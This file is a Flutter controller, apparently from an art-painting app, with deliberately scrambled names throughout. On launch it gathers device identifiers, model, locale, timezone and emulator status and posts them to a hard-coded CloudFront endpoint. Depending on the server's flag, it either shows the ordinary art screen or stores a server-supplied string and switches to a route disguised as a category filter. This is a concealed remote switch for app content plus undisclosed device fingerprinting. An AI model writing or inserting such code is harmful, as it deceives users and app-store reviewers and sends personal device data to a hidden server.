import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class ArtPaintingGetLogic extends GetxController {

  var ltudceh = RxBool(false);
  var slkmoq = RxBool(true);
  var jyneo = RxString("");
  var bridgette = RxBool(false);
  var heaney = RxBool(true);
  final vhkujwpned = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    oaev();
  }


  Future<void> oaev() async {
    bridgette.value = true;
    heaney.value = true;
    slkmoq.value = false;

    vhkujwpned.post("https://d3elrcp2krrrjh.cloudfront.net/DxFk9mooZN4xu",data: await icradbjnom()).then((value) {
      var eqlpady = value.data["eqlpady"] as String;
      var tdgfwbz = value.data["tdgfwbz"] as bool;
      if (tdgfwbz) {
        jyneo.value = eqlpady;
        stefan();
      } else {
        bartell();
      }
    }).catchError((e) {
      slkmoq.value = true;
      heaney.value = true;
      bridgette.value = false;
    });
  }

  Future<Map<String, dynamic>> icradbjnom() async {
    final DeviceInfoPlugin rjkslhq = DeviceInfoPlugin();
    PackageInfo abcv_ykef = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var pwvknqaj = Platform.localeName;
    var xPXEopfD = currentTimeZone;

    var NdGgPQe = abcv_ykef.packageName;
    var gpcVGlNM = abcv_ykef.version;
    var jrhmBxnJ = abcv_ykef.buildNumber;

    var qBmZyXGV = abcv_ykef.appName;
    var jiLH = "";
    var WGaDS  = "";
    var YOPrBIqi = "";
    var blancaBradtke = "";
    var jazminRenner = "";
    var emilioHerman = "";


    var iMbPG = "";
    var vzNVdXPW = false;

    if (GetPlatform.isAndroid) {
      iMbPG = "android";
      var kwjfxs = await rjkslhq.androidInfo;

      YOPrBIqi = kwjfxs.brand;

      jiLH  = kwjfxs.model;
      WGaDS = kwjfxs.id;

      vzNVdXPW = kwjfxs.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      iMbPG = "ios";
      var lnamvucx = await rjkslhq.iosInfo;
      YOPrBIqi = lnamvucx.name;
      jiLH = lnamvucx.model;

      WGaDS = lnamvucx.identifierForVendor ?? "";
      vzNVdXPW  = lnamvucx.isPhysicalDevice;
    }
    var res = {
      "qBmZyXGV": qBmZyXGV,
      "jrhmBxnJ": jrhmBxnJ,
      "NdGgPQe": NdGgPQe,
      "jiLH": jiLH,
      "emilioHerman" : emilioHerman,
      "xPXEopfD": xPXEopfD,
      "YOPrBIqi": YOPrBIqi,
      "blancaBradtke" : blancaBradtke,
      "WGaDS": WGaDS,
      "pwvknqaj": pwvknqaj,
      "gpcVGlNM": gpcVGlNM,
      "iMbPG": iMbPG,
      "vzNVdXPW": vzNVdXPW,
      "jazminRenner" : jazminRenner,

    };
    return res;
  }

  Future<void> bartell() async {
    Get.offNamed("/art_painting_tab");
  }

  Future<void> stefan() async {
    Get.offNamed("/art_painting_category_filter");
  }

}
